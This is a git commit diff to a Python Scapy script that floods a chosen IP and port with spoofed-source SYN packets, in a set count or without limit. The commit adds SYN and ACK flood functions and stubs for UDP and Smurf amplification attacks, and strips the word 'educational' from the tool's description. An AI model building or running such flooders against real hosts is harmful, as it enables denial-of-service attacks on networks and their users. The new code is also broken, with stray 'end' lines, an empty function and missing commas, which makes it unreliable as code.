95b0ea90c4cec36fc4f73da47c9985cab7c3cd48
Marcus Andersson <anderssonm@ai.pri>
2016-10-13 12:11:43 +0800

    work in progress

--- scapytest.py
+++ scapytest.py
@@ -10,26 +10,43 @@ import urllib2
 if os.getuid() != 0: # Checks to see if the user running the script is root.
     print("You need to run this program as root for it to function correctly.")
     sys.exit(1)
-parser = argparse.ArgumentParser(description='This educational tool sends SYN requests to the target specified in the arguments.') # This and preceding 4 lines used to control the arguments entered in the CLI.
+parser = argparse.ArgumentParser(description='This tool sends requests to the target specified in the arguments.') # This and preceding 4 lines used to control the arguments entered in the CLI.
 parser.add_argument('-d', action="store",dest='source', help='The destination IP address for the SYN packet')
-parser.add_argument('-c', action="store",dest='count', help='The amount of SYN packets to send. (enter X for unlimited)')
-parser.add_argument('-p', action="store",dest='port', help='The destination port for the SYN packet')
+parser.add_argument('-c', action="store",dest='count', help='The amount of packets to send. (enter X for unlimited)')
+parser.add_argument('-p', action="store",dest='port', help='The destination port. Will be used except for ICMP')
 args = parser.parse_args()
 if len(sys.argv) == 1: # Forces the help text to be displayed if no arguments are entered
     parser.print_help()
     sys.exit(1)
 args = vars(args) # converts the arguments into dictionary format for easier retrieval.
-iterationCount = 0 # variable used to control the while loop for the amount of times a packet is sent.
+i = 0 # variable used to control the while loop for the amount of times a packet is sent.
+
+def sendSYN(d, p):
+    a=IP(dst=d)/TCP(flags="S", sport=RandShort(), dport=p)
+    send(a, verbose=0) #transmit packet
+end
+
+def sendACK(d, p):
+    a=IP(dst=d)/TCP(flags="A", sport=RandShort(), dport=p)
+    send(a, verbose=0) #transmit packet
+end
+
+def sendUDP(d, p):
+
+end
+
+def sendSMURF(d, p):
+    #Pausing this one, as another active IP is required. Consider using the target's gateway and guessing it to be x.x.x.1'
+end
+
 if args['count'] == "X" or args['count'] == "x": # If the user entered an X or x into the count argument (wants unlimited SYN segments sent)
     while (1 == 1):
-        a=IP(dst=args['source'])/TCP(flags="S",  sport=RandShort(),  dport=int(args['port'])) # Creates the packet and assigns it to variable a
-        send(a,  verbose=0) # Sends the Packet
-        iterationCount = iterationCount + 1
-        print(str(iterationCount) + " Packet Sent")
+        sendSYN(args['source'] int(args['port']))
+        i = i + 1
+        print(str(i) + " Packet Sent")
 else: # executed if the user defined an amount of segments to send.
-    while iterationCount < int(args['count']):
-        a=IP(dst=args['source'])/TCP(flags="S", sport=RandShort(), dport=int(args['port'])) # Creates the packet and assigns it to variable a
-        send(a,  verbose=0) # Sends the Packet
-        iterationCount = iterationCount + 1
-        print(str(iterationCount) + " Packet Sent")
+    while i < int(args['count']):
+        sendSYN(args['source'] int(args['port']))
+        i = i + 1
+        print(str(i) + " Packet Sent")
 print("All packets successfully sent.")
